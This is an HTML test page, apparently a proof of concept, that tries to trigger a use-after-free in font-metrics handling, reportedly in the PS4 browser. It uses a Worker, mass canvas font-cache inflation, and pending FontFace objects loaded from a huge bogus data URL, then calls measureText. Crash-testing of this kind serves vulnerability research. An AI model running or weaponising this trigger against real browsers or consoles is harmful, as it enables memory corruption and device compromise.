<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PS4 Font Metrics UAF Test - Option B</title>
</head>
<body>
    <p>This test passes if it does not crash.</p>
    <div id="status">Testing via Worker...</div>

    <script>
    
    // Código executado dentro do Worker para orquestrar o teste
    const WORKER_SCRIPT = `
        self.onmessage = function(e) {
            if (e.data.cmd === 'start') {
                // Notifica a thread principal para inflar o cache e executar as medições
                self.postMessage({ action: 'PRUNE_CACHE' });
                
                for (let attempt = 0; attempt < 2; attempt++) {
                    self.postMessage({ action: 'MEASURE', attempt: attempt });
                }

                self.postMessage({ action: 'DONE' });
            }
        };
    `;

    const blob = new Blob([WORKER_SCRIPT], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));

    const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
    const keepAlive = [];

    worker.onmessage = function(e) {
        const msg = e.data;

        if (msg.action === 'PRUNE_CACHE') {
            // Thread Principal: Inflar o cache de fontes usando <canvas>
            const dummies = [];
            for (let i = 0; i < 3500; i++) {
                const dummy = document.createElement('canvas');
                dummy.width = 1;
                dummy.height = 1;
                const ctx = dummy.getContext('2d');
                ctx.font = '10px "dummy' + i + '"';
                dummies.push(ctx);
            }
        } 
        else if (msg.action === 'MEASURE') {
            // Thread Principal: Executar a medição com o contexto 2D
            const attempt = msg.attempt;
            const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
            const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });

            document.fonts.add(metricsDonor);
            document.fonts.add(measured);

            const canvas = document.createElement('canvas');
            canvas.width = 64;
            canvas.height = 64;
            const context = canvas.getContext('2d');

            context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
            keepAlive.push(metricsDonor, measured, context);

            context.measureText('\u13A0\u13A2\u13A4');
        } 
        else if (msg.action === 'DONE') {
            document.getElementById('status').innerText = 'PASS if no crash';
            
        }
    };

    window.onload = function() {
        worker.postMessage({ cmd: 'start' });
    };
    </script>
</body>
</html>
